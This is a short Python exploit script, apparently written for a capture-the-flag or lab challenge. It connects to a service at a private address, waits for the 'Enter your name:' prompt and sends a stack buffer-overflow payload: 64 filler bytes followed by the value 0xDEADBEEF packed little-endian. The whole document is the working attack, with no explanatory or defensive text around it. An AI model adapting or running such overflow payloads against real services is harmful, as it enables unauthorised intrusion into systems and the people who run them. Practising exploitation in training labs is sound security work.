import socket
import struct

HOST, PORT = "10.2.0.5", 9999
payload = b"A" * 64 + struct.pack("<I", 0xDEADBEEF) + b"\n"

s = socket.create_connection((HOST, PORT))
# prompt まで読む（雑でもOK）
data = s.recv(4096)
while b"Enter your name:" not in data:
    data += s.recv(4096)

s.sendall(payload)
print(s.recv(4096).decode("latin-1", "replace"))
